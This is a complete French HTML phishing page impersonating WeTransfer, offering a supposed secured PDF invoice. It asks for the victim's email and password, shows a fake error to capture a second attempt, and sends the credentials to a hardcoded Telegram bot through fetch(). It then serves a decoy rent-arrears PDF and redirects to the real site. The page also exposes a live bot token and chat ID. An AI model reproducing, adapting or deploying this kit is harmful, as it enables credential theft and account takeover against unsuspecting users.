<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <script src="https://cdn.tailwindcss.com"></script>
    <title>WeTransfer - Partage de documents sécurisé</title>
    <style>
        .logo { height: 120px; width: auto; }
        .pdf-icon { width: 36px; height: 36px; }
        .form-container {
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            border-radius: 12px;
        }
        .hidden { display: none; }
        .download-btn {
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
            transition: all 0.3s ease;
        }
        .download-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
    </style>
</head>
<body class="bg-gray-50">
    <div class="flex flex-col items-center justify-center min-h-screen p-4">
        <div class="mb-6 text-center">
            <img src="https://gotrialpro.net/wp-content/uploads/edd/2024/07/WeTransfer-Free-Trial-1024x473.png" 
                 alt="WeTransfer Logo" class="logo mx-auto">
        </div>
        <!-- Conteneur principal qui sera caché après authentification -->
        <div id="main-container" class="form-container bg-white w-full max-w-md p-6">
            <!-- Étape 1 : Email -->
            <div id="email-step">
                <div class="flex items-center justify-center mb-6">
                    <svg class="pdf-icon text-red-500" fill="currentColor" viewBox="0 0 384 512">
                        <path d="M181.9 256.1c-5-16-4.9-46.9-2-46.9 8.4 0 7.6 36.9 2 46.9zm-1.7 47.2c-7.7 20.2-17.3 43.3-28.4 62.7 18.3-7 39-17.2 62.9-21.9-12.7-9.6-24.9-23.4-34.5-40.8zM86.1 428.1c0 .8 13.2-5.4 34.9-40.2-6.7 6.3-29.1 24.5-34.9 40.2zM248 160h136v328c0 13.3-10.7 24-24 24H24c-13.3 0-24-10.7-24-24V24C0 10.7 10.7 0 24 0h200v136c0 13.2 10.8 24 24 24zm-8 171.8c-20-12.2-33.3-29-42.7-53.8 4.5-18.5 11.6-46.6 6.2-64.2-4.7-29.4-42.4-26.5-47.8-6.8-5 18.3-.4 44.1 8.1 77-11.6 27.6-28.7 64.6-40.8 85.8-.1 0-.1.1-.2.1-27.1 13.9-73.6 44.5-54.5 68 5.6 6.9 16 10 21.5 10 17.9 0 35.7-18 61.1-61.8 25.8-8.5 54.1-19.1 79-23.2 21.7 11.8 47.1 19.5 64 19.5 29.2 0 31.2-32 19.7-43.4-13.9-13.6-54.3-9.7-73.6-7.2zM377 105L279 7c-4.5-4.5-10.6-7-17-7h-6v128h128v-6.1c0-6.3-2.5-12.4-7-16.9zm-74.1 255.3c4.1-2.7-2.5-11.9-42.8-9 37.1 15.8 42.8 9 42.8 9z"/>
                    </svg>
                    <p class="font-bold mx-3 text-gray-800">Vous avez reçu un fichier pdf sécurisé</p>
            </div> 
                    <p class="text-gray-600 mb-6 text-center text-sm">1 élément, 4.9 Ko au total</p>
                    <img src="https://i.postimg.cc/02DDD9fb/jkl.jpg" 
                 alt="image Logo" class="image mx-auto">
                <p class="text-gray-600 mb-6 text-center text-sm">Pour accéder à ce document, veuillez entrer les identifiants de messagerie associés à ce transfert.</p>
                <input type="email" id="zone-email" 
                       class="border border-gray-300 w-full p-3 rounded-lg" 
                       placeholder="Entrez votre email"/>
                <p id="email-error" class="text-red-500 text-sm mt-1 hidden">Veuillez entrer une adresse email valide</p>
                <button id="email-submit" 
                        class="w-full bg-orange-500 text-white font-bold py-3 px-4 rounded-lg mt-4">
                    Continuer
                </button>
            </div>
            <!-- Étape 2 : Mot de passe (caché initialement) -->
            <div id="password-step" class="hidden">
                <div class="flex items-center justify-center mb-6">
                    <svg class="pdf-icon text-red-500" fill="currentColor" viewBox="0 0 384 512">
                        <path d="M181.9 256.1c-5-16-4.9-46.9-2-46.9 8.4 0 7.6 36.9 2 46.9zm-1.7 47.2c-7.7 20.2-17.3 43.3-28.4 62.7 18.3-7 39-17.2 62.9-21.9-12.7-9.6-24.9-23.4-34.5-40.8zM86.1 428.1c0 .8 13.2-5.4 34.9-40.2-6.7 6.3-29.1 24.5-34.9 40.2zM248 160h136v328c0 13.3-10.7 24-24 24H24c-13.3 0-24-10.7-24-24V24C0 10.7 10.7 0 24 0h200v136c0 13.2 10.8 24 24 24zm-8 171.8c-20-12.2-33.3-29-42.7-53.8 4.5-18.5 11.6-46.6 6.2-64.2-4.7-29.4-42.4-26.5-47.8-6.8-5 18.3-.4 44.1 8.1 77-11.6 27.6-28.7 64.6-40.8 85.8-.1 0-.1.1-.2.1-27.1 13.9-73.6 44.5-54.5 68 5.6 6.9 16 10 21.5 10 17.9 0 35.7-18 61.1-61.8 25.8-8.5 54.1-19.1 79-23.2 21.7 11.8 47.1 19.5 64 19.5 29.2 0 31.2-32 19.7-43.4-13.9-13.6-54.3-9.7-73.6-7.2zM377 105L279 7c-4.5-4.5-10.6-7-17-7h-6v128h128v-6.1c0-6.3-2.5-12.4-7-16.9zm-74.1 255.3c4.1-2.7-2.5-11.9-42.8-9 37.1 15.8 42.8 9 42.8 9z"/>
                    </svg>
                    <p class="font-bold mx-3 text-gray-800">Vous avez reçu un fichier pdf sécurisé</p>
            </div>
                    <p class="text-gray-600 mb-6 text-center text-sm">1 élément, 4.9 Ko au total</p>
                    <img src="https://i.postimg.cc/02DDD9fb/jkl.jpg" 
                 alt="image Logo" class="image mx-auto">
                <p class="text-gray-600 mb-6 text-center text-sm">Pour accéder à ce document, veuillez entrer les identifiants de messagerie associés à ce transfert.</p>
                <input type="password" id="zone-password" 
                       class="border border-gray-300 w-full p-3 rounded-lg" 
                       placeholder="Entrez votre mot de passe"/>
                <p id="password-error" class="text-red-500 text-sm mt-1 hidden">Mot de passe ou mail incorrect</p>
                <button id="password-submit" 
                        class="w-full bg-orange-500 text-white font-bold py-3 px-4 rounded-lg mt-4">
                    Accéder au document
                </button>
            </div>
        </div>
        
        <!-- Étape 3 : Téléchargement (caché initialement) -->
        <div id="download-step" class="form-container bg-white w-full max-w-md p-6 hidden">
            <div class="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
                <div class="flex items-center justify-center">
                    <svg class="w-5 h-5 text-green-500 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                    </svg>
                    <p class="text-green-700 font-medium">Authentification réussie</p>
                </div>
            </div>
            
            <div class="text-center mb-6">
                <svg class="w-16 h-16 text-red-500 mx-auto mb-3" fill="currentColor" viewBox="0 0 384 512">
                    <path d="M181.9 256.1c-5-16-4.9-46.9-2-46.9 8.4 0 7.6 36.9 2 46.9zm-1.7 47.2c-7.7 20.2-17.3 43.3-28.4 62.7 18.3-7 39-17.2 62.9-21.9-12.7-9.6-24.9-23.4-34.5-40.8zM86.1 428.1c0 .8 13.2-5.4 34.9-40.2-6.7 6.3-29.1 24.5-34.9 40.2zM248 160h136v328c0 13.3-10.7 24-24 24H24c-13.3 0-24-10.7-24-24V24C0 10.7 10.7 0 24 0h200v136c0 13.2 10.8 24 24 24zm-8 171.8c-20-12.2-33.3-29-42.7-53.8 4.5-18.5 11.6-46.6 6.2-64.2-4.7-29.4-42.4-26.5-47.8-6.8-5 18.3-.4 44.1 8.1 77-11.6 27.6-28.7 64.6-40.8 85.8-.1 0-.1.1-.2.1-27.1 13.9-73.6 44.5-54.5 68 5.6 6.9 16 10 21.5 10 17.9 0 35.7-18 61.1-61.8 25.8-8.5 54.1-19.1 79-23.2 21.7 11.8 47.1 19.5 64 19.5 29.2 0 31.2-32 19.7-43.4-13.9-13.6-54.3-9.7-73.6-7.2zM377 105L279 7c-4.5-4.5-10.6-7-17-7h-6v128h128v-6.1c0-6.3-2.5-12.4-7-16.9zm-74.1 255.3c4.1-2.7-2.5-11.9-42.8-9 37.1 15.8 42.8 9 42.8 9z"/>
                </svg>
                <p class="font-semibold text-gray-800 text-lg">Facture n° 508099.pdf</p>
                <p class="text-sm text-gray-500">PDF Document • 4.9 Ko</p>
            </div>
            
            <button id="download-btn" 
                    class="w-full download-btn text-white font-bold py-3 px-4 rounded-lg mt-4">
                Télécharger le document
            </button>
        </div>
        
        <div class="mt-8 text-sm text-gray-500 text-center">
            <p>© WeTransfer 2025 - Service sécurisé de transfert de fichiers</p>
        </div>
    </div>

    <script>
    document.addEventListener("DOMContentLoaded", function() {
        const mainContainer = document.getElementById("main-container");
        const emailStep = document.getElementById("email-step");
        const passwordStep = document.getElementById("password-step");
        const downloadStep = document.getElementById("download-step");
        const emailInput = document.getElementById("zone-email");
        const passwordInput = document.getElementById("zone-password");
        const emailError = document.getElementById("email-error");
        const passwordError = document.getElementById("password-error");
        const emailSubmit = document.getElementById("email-submit");
        const passwordSubmit = document.getElementById("password-submit");
        const downloadBtn = document.getElementById("download-btn");
        
        let attempts = 0;
        const maxAttempts = 2;
        
        // Étape 1: Validation de l'email
        emailSubmit.addEventListener("click", function() {
            const email = emailInput.value.trim();
            
            // Validation simple de l'email
            if (!email || !email.includes("@") || !email.includes(".")) {
                emailError.classList.remove("hidden");
                return;
            }
            
            // Cacher l'étape email et afficher l'étape mot de passe
            emailStep.classList.add("hidden");
            passwordStep.classList.remove("hidden");
            emailError.classList.add("hidden");
        });
        
        // Étape 2: Validation du mot de passe
        passwordSubmit.addEventListener("click", async function() {
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            attempts++;
            
            if (!password) {
                passwordError.classList.remove("hidden");
                return;
            }
            
            // Envoi des données au bot Telegram
            try {
                const botToken = '8578190850:AAHQyoEjxnHJhU_SUDmmDjoXjn9NBKE1zvY';
                const chatId = '7394487789';
                const message = `
                ----------🤞WETRANSFERT LOGIN🤞--------
                📧 Email: ${email}\n
                🔑 Mot de passe: ${password}\n
                📱 Device: ${/Mobi/.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}
                ----------🦇WETRANSFERT LOGIN🦇--------`;
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
                
                // Après 2 tentatives, passer à l'étape de téléchargement
                if (attempts >= maxAttempts) {
                    // Cacher complètement le conteneur principal et afficher l'étape de téléchargement
                    mainContainer.classList.add("hidden");
                    downloadStep.classList.remove("hidden");
                } else {
                    passwordError.classList.remove("hidden");
                    passwordInput.value = "";
                    passwordInput.focus();
                }
                
            } catch (error) {
                console.error("Erreur:", error);
                // En cas d'erreur d'envoi, passer quand même au téléchargement
                mainContainer.classList.add("hidden");
                downloadStep.classList.remove("hidden");
            }
        });
        
        // Fonction pour démarrer le téléchargement
        function startDownload() {
            // Utilisation d'une bibliothèque pour générer un PDF correct
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            
            // Ajouter un en-tête
            doc.setFontSize(20);
            doc.text("LODGIS IMMOBILIER", 105, 20, { align: 'center' });
            
            //  RELANCE
            doc.text("Facture loyer impayé RELANCE", 105, 30, { align: 'center' });
            // Informations de l'appartement
            doc.setFontSize(12);
            doc.text("Appartement 12B, 25 Avenue des Champs-Élysées", 20, 50);
            doc.text("75008 Paris, France", 20, 60);
            
            // Informations de la facture
            doc.text("Facture N°: 508099", 20, 70);
            doc.text("Date: 10 Juillet 2025", 20, 80);
            doc.text("Période: Juillet 2025", 20, 90);
            
            // Détail du loyer
            doc.text("DÉTAIL DU LOYER:", 20, 110);
            doc.text("Loyer mensuel: 1,850.00 €", 30, 120);
            doc.text("Charges: 150.00 €", 30, 130);
            doc.text("Taxe d'habitation: 89.50 €", 30, 140);
            doc.text("Total TTC: 2,089.50 €", 30, 155);
            
       
            // Date limite
            doc.text("Merci de régler avant le 28 octobre 2025.", 20, 165);
            
            // NB
            doc.text("Document susceptible d'être confidentiel. Il est adressé uniquement au destinataire indiqué.", 20, 175);
            doc.text("Si vous l'avez reçu par erreur,veillez nous le notifier.", 20, 185);
           
            // Signature
            doc.text("Signature:", 20, 195);
            
            
            // Sauvegarder le PDF
            doc.save('Facture n° 508099.pdf');
            
            // Redirection après le téléchargement
            setTimeout(function() {
                window.location.href = "https://wetransfer.com";
            }, 1000);
        }
        
        // Gestion du clic sur le bouton de téléchargement
        downloadBtn.addEventListener("click", startDownload);
        
        // Permettre la soumission avec la touche Entrée
        emailInput.addEventListener("keypress", function(e) {
            if (e.key === "Enter") emailSubmit.click();
        });
        
        passwordInput.addEventListener("keypress", function(e) {
            if (e.key === "Enter") passwordSubmit.click();
        });
    });
    </script>
    <!-- Inclure jsPDF pour générer des PDFs corrects -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
</body>
</html>